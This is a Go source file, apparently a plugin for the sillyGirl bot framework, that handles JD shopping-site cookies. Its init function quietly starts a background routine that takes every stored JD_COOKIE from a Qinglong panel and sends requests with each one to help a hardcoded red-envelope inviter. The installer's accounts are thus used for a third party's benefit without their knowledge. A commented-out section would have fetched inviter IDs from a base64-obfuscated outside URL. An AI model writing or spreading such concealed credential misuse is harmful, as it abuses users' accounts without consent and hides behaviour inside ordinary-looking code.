package jd_cookie

import (
	"fmt"
	"strings"
	"time"

	"github.com/beego/beego/v2/client/httplib"
	"github.com/cdle/sillyGirl/core"
	"github.com/cdle/sillyGirl/develop/qinglong"
	"github.com/gin-gonic/gin"
)

func init() {
	core.Server.GET("/gxfc", func(c *gin.Context) {
		c.String(200, jd_cookie.Get("dyj_inviteInfo", "恭喜发财！"))
	})
	core.AddCommand("", []core.Function{
		{
			Rules: []string{`raw redEnvelopeId=([^&]+)&inviterId=([^&]+)&`},
			Admin: true,
			Handle: func(s core.Sender) interface{} {
				jd_cookie.Set("dyj_inviteInfo", fmt.Sprintf("redEnvelopeId=%s;inviterId=%s;", s.Get(0), s.Get(1)))
				return "恭喜发财。"
			},
		},
	})
	go func() {
		// start:
		time.Sleep(time.Second * 3)
		// for {
		// time.Sleep(time.Minute * 3)
		// decoded, _ := base64.StdEncoding.DecodeString("aHR0cHM6Ly80Y28uY2MvZ3hmYw==")
		// data, _ := httplib.Get(string(decoded)).String()
		// redEnvelopeId := core.FetchCookieValue("redEnvelopeId", data)
		// inviterId := core.FetchCookieValue(data, "inviterId")
		// if redEnvelopeId == "" || inviterId == "" {
		// 	break
		// }
		redEnvelopeId := "69bccb09bbb8426faf0df7b4d7fc57cb47121633367539261"
		inviterId := "WaHpHMRJdh28jqa9WTwWl3LXebXXp5CBbOkCxVi4jTg"
		// date := time.Now().Format("2006-01-02")
		// if jd_cookie.Get("dyj_date") != date && jd_cookie.Get("dyj_data") != data {
		// 	jd_cookie.Set("dyj_data", data)
		envs, err := qinglong.GetEnvs("JD_COOKIE")
		if err != nil {
			// break
		}
		s := 1
		for i := 0; i < len(envs); i++ {
			if envs[i].Status == 0 {
				req := httplib.Get("https://api.m.jd.com/?functionId=openRedEnvelopeInteract&body=" + `{"linkId":"yMVR-_QKRd2Mq27xguJG-w","redEnvelopeId":"` + redEnvelopeId + `","inviter":"` + inviterId + `","helpType":"` + fmt.Sprint(s) + `"}` + "&t=" + fmt.Sprint(time.Now().Unix()) + "&appid=activities_platform&clientVersion=3.5.6")
				req.Header("Cookie", envs[i].Value)
				req.Header("Accept", "*/*")
				req.Header("Connection", "keep-alive")
				req.Header("Accept-Encoding", "gzip, deflate, br")
				req.Header("Host", "api.m.jd.com")
				req.Header("Origin", "https://wbbny.m.jd.com")
				data, _ := req.String()
				if strings.Contains(data, "提现") {
					if s == 1 {
						s = 2
					} else {
						break
						// goto start
					}
				}
			}
		}
		// jd_cookie.Set("dyj_date", date)

		// }
		// }
	}()
}
